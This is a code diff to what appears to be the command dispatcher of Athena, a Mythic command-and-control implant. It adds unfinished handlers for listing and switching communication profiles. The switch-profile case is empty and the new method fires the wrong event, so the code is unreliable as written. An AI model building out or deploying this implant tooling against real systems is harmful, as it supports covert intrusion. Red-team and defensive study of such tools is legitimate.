@@ -20,6 +20,10 @@ namespace Athena.Commands
     {
         public delegate void SetSleepAndJitterHandler(object sender, TaskEventArgs e);
         public event EventHandler<TaskEventArgs> SetSleepAndJitter;
+        public delegate void SetForwarderHandler(object sender, ProfileEventArgs e);
+        public event EventHandler<ProfileEventArgs> SetForwarder;
+        public delegate void SetProfileHandler(object sender, ProfileEventArgs e);
+        public event EventHandler<ProfileEventArgs> SetProfile;
         public delegate void StartForwarderHandler(object sender, TaskEventArgs e);
         public event EventHandler<TaskEventArgs> StartForwarder;
         public delegate void StopForwarderHandler(object sender, TaskEventArgs e);
@@ -30,7 +34,6 @@ namespace Athena.Commands
         public event EventHandler<TaskEventArgs> StopSocks;
         public delegate void ExitRequestedHandler(object sender, TaskEventArgs e);
         public event EventHandler<TaskEventArgs> ExitRequested;
-
         private ConcurrentDictionary<string, MythicJob> activeJobs { get; set; }
         private AssemblyHandler assemblyHandler { get; }
         private DownloadHandler downloadHandler { get; }
@@ -68,7 +71,7 @@ namespace Athena.Commands
                     this.responseResults.Add(new ResponseResult()
                     {
                         task_id = task.id,
-                        user_output = "Failed to impersonate!",
+                        user_output = "Failed to switch context!",
                         status = "errored",
                         completed = "true",
                     });
@@ -122,6 +125,8 @@ namespace Athena.Commands
                     StartInternalForwarder(job); //I could maybe make this a loadable plugin? it may require some changes to how delegates are passed
                     this.activeJobs.Remove(task.id, out _);
                     break;
+                case "1CDEDE1665F21542BDE8DD9F3C4E362E": //list-profiles
+                    break;
                 case "EC4D1EB36B22D19728E9D1D23CA84D1C": //load
                     this.responseResults.Add(await assemblyHandler.LoadCommandAsync(job));
                     this.activeJobs.Remove(task.id, out _);
@@ -160,7 +165,10 @@ namespace Athena.Commands
                         task_id = job.task.id,
                     });
                     this.activeJobs.Remove(task.id, out _);
-                    break; 
+                    break;
+                case "48C8331B1BF8E91B67A05C697C05259F": //switch-profile
+                    
+                    
 #if WINBUILD
                 case "94A08DA1FECBB6E8B46990538C7B50B2": //token
                     var tokenInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
@@ -271,6 +279,17 @@ namespace Athena.Commands
         {
             //todo
         }
+
+        /// <summary>
+        /// EventHandler to update sleep and jitter
+        /// </summary>
+        /// <param name="job">MythicJob to pass with the event</param>
+        private void SwitchProfile(MythicJob job)
+        {
+            ProfileEventArgs switchArgs = new ProfileEventArgs(job);
+            SetSleepAndJitter(this, switchArgs);
+        }
+
         /// <summary>
         /// Provide a list of repsonses to the MythicClient
         /// </summary>
